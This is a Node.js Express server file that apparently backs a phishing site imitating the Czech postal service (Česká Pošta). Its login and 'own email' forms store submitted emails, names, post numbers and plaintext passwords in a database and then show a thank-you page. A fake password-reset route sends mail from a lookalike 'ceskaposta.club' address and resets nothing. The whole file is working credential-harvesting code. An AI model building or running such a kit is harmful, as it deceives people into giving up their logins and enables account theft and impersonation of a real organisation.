// import all libraries
const express = require("express")
const path = require("path")
const bodyParser = require("body-parser")
const { emitKeypressEvents } = require("readline")
const crypto = require("crypto")
const nodemailer = require("nodemailer")
require("dotenv").config()

// configure knex
const knex = require("knex")({
    client: "mysql2",
    connection: {
        host: process.env.MYSQL_HOST,
        port: process.env.MYSQL_PORT,
        user: process.env.MYSQL_USER,
        password: process.env.MYSQL_PASSWORD,
        database: process.env.MYSQL_DATABASE
    }
})

// init our app
const app = express()
const port = 8000;

// use static files renderer and bodyparser middleware
app.use(express.static("public"))
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }))

//! GET paths
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "/public/index.html"))
})

app.get("/vlastni-email", (req, res) => {
    res.sendFile(path.join(__dirname, "/public/vlastni-email.html"))
})

app.get("/zapomenute-heslo", (req, res) => {
    res.sendFile(path.join(__dirname, "public/zapomenute-heslo.html"))
})

//! POST paths
// default login form on index
app.post("/postDefaultLogin", (req, res) => {
    knex("defaultLogins").insert({
        email: req.body.email, password: req.body.password
    }).then((result) => {
        console.log("Default login OK")
        res.sendFile(path.join(__dirname, "public/dekujeme.html"))
    })
})

// reset password form
app.post("/postResetPassword", async (req, res) => {
    // TODO: send email 
    // generate random 16 hex bytes
    let randomString = crypto.randomBytes(8)
    randomString = randomString.toString('hex')
    console.log(randomString)

    // * TEST ACCOUNT
    let testAcc = await nodemailer.createTestAccount()

    let transporter = nodemailer.createTransport({
        host: process.env.MAIL_SERVER,
        port: 587,
        auth: {
            user: process.env.MAIL_USER,
            pass: process.env.MAIL_PASSWORD
        }
    })

    let info = await transporter.sendMail({
        from: "'Obnovení hesla Česká Pošta Club' <obnovahesla@ceskaposta.club>",
        to: req.body.email,
        subject: "Obnova hesla",
        text: randomString
    })

    knex("resetPassword").insert({
        email: req.body.email
    }).then((result) => {
        console.log("Reset password OK")
        res.sendFile(path.join(__dirname, "public/heslo-zmeneno.html"))
    })
})

// no cpost.cz email form
app.post("/postOwnEmail", (req, res) => {
    knex("customMail").insert({
        firstName: req.body.firstName,
        secondName: req.body.surname,
        email: req.body.email,
        postNumber: req.body.postNo,
        password: req.body.password
    }).then((result) => {
        console.log("Custom mail OK")
        res.sendFile(path.join(__dirname, "public/dekujeme.html"))
    })
})

// run the app
app.listen(port, process.env.EXTERNAL_IP, () => {
    console.log(`app on ${port}`)
})